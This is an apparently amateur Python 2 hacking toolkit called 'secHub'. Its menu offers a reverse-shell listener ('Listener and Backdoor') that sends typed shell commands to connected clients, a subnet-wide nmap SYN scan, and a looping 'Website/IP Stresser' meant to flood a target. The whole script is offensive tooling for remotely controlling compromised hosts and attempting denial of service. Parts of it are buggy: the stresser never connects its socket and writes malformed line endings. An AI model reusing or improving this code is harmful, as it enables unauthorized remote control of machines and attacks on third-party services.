import os
import sys
import socket
import subprocess
import time


print """
      	 ______     ______     ______     __  __     __  __     ______    
       	/\  ___\   /\  ___\   /\  ___\   /\ \_\ \   /\ \/\ \   /\  == \   
      	\ \___  \  \ \  __\   \ \ \____  \ \  __ \  \ \ \_\ \  \ \  __<   
       	 \/\_____\  \ \_____\  \ \_____\  \ \_\ \_\  \ \_____\  \ \_____\ 
	  \/_____/   \/_____/    \/_____/  \/_/\/_/   \/_____/   \/_____/ 
	                       Listener and Backdoor
			       	  Network Scanner
			      	   Version :: 0.1
                            
"""

def PlatformCheck():
	if sys.platform == 'win32':
		print("[!] Windows Detected! secHub is Built For Linux. ")  ##Windows 32-bit Check

	if sys.platform == 'win64':
		print("[!] Windows Detected! secHub is Built For Linux. ")  ##Windows 64-bit Check

	else:
		print("[+] Linux Detected...\n")  ##Nothing Beats Linux!

PlatformCheck()
time.sleep(0.5)
	
def sockListen():
	global host
	global port
	global s
	host = ''
	port = input("() Enter a Port to Listen On: ")

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
					##Creates Socket
	try:
		s.bind((host, port))

	except socket.error as e:
		print("[-] Bind Error: " + str(e))
		return False
	
	os.system('clear')

	try:
	
		print("[*] Binding Socket To Port: " + str(port))
		s.listen(5)
		time.sleep(3)

		print("[!] Listening For Incoming Intervals")
		time.sleep(3)
		print("[+] Awaiting Connection on LAN")

	except socket.error as e:
		print(str(e))

	except KeyboardInterrupt:
		print("\n[-] User Aborted! ")
		sys.exit(0)

def sockAccept():

	try:
		while True:
			conn, addr = s.accept()	  ##Accepts Connection from Client
			print("[+] Connection With: " + str(addr[0]) + ":" + str(addr[1])) 
			send_commands(conn)
			conn.close()

	except socket.error as e:
		print(str(e))

	except KeyboardInterrupt:
		print("\n[-] User Aborted! ")
		sys.exit(0)


def send_commands(conn):
	try:
		while True:
			command = raw_input("\nShell> ")   ##Reads Process and opens up Prompt
			if 'kill' in command:
				conn.close()
				s.close()
				break
				return None

			if 'enter' in command:
				return send_commands(conn)

			if len(str.encode(command)) > 0:
			
 	                	conn.send(str.encode(command))

        	        	client_responce = str(conn.recv(1024))

                		print(client_responce)

 			else:
				conn.send(command)
				print conn.recv(1024)

	except socket.error as x:
		print(str(x))

	except Exception:
		print("[-] An Error in the Command Shell Has Occured.")

	except KeyboardInterrupt:
		print("\n\n[*] User Aborted! ")
		sys.exit(0)


def detectNmap():
	try:
		check_package = subprocess.call("nmap")
		os.system('clear')

		if check_package == True:
			print("Nmap Found!... ")

	except OSError as e:
		print("[!] Error: Nmap Not found...\n")
		print("Install: sudo apt-get install nmap")
		return False

def nmapBasic():
	nmap_host = raw_input("(*) Enter HOST/LHOST To Scan: ")
	start_scan = os.system('sudo nmap -sS -sV ' + nmap_host +'/24')


def UnleashTheBeast():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	beast_input = raw_input("() Enter IP/Website To d3sTr0y: ")
	troll_input = raw_input("() Packet Number: ")

	try: 
		print("\n[*] Attacking " + beast_input + "...")
		time.sleep(1)

		print(">>GET /" + troll_input + "HTTP/1.1")
		s.send("GET /" + troll_input + " HTTP/1.1\r\n")
		s.send("HOST: " + beast_input + "/r/n/r/n")
		s.close()
	
	except socket.error as msg:
		print(str(msg))
		main()
	
		
def main():


	start_script_input = raw_input("1: Listener and Backdoor\n2: Scan Network With Nmap\n3: Website/IP Stresser\n"
			"4: Exit\n5: Clear Screen\n\nroot@secHub:~# ")

	if start_script_input == '1':
		time.sleep(0.5)
		sockListen()
		sockAccept()

	if start_script_input == '2':
		detectNmap()
		nmapBasic()
		os.system('clear')
		return main()

	if start_script_input == '3':
		try:
			for x in range(1, 1000):
				UnleashTheBeast()

		except Exception:
			main()
		
	if start_script_input == '4':
		sys.exit()

	if start_script_input == '5':
		os.system('clear')
		return main()


	

if __name__ == "__main__":
	main()


